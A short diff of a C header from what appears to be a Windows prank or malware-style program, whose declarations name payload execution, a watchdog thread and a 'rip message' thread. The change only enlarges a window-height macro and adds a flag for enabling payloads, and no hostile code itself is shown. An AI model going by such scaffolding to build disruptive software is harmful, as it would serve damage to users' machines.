@@ -15,7 +15,7 @@ processorArchitecture='*' publicKeyToken='6595b64144ccf1df' language='*'\"")
 #define ROWS nPayloads/COLUMNS
 #define SPACE 10
 #define WINDOWWIDTH COLUMNS * BTNWIDTH + (COLUMNS + 1)*SPACE
-#define WINDOWHEIGHT ROWS * BTNHEIGHT + (ROWS + 1)*SPACE + 16
+#define WINDOWHEIGHT ROWS * BTNHEIGHT + (ROWS + 1)*SPACE + 32
 #endif
 
 #pragma once
@@ -44,6 +44,7 @@ DWORD WINAPI ripMessageThread(LPVOID);
 DWORD WINAPI watchdogThread(LPVOID);
 #else
 DWORD WINAPI keyboardThread(LPVOID lParam);
+extern BOOLEAN enablePayloads;
 #endif
 
 int payloadExecute(int, int);
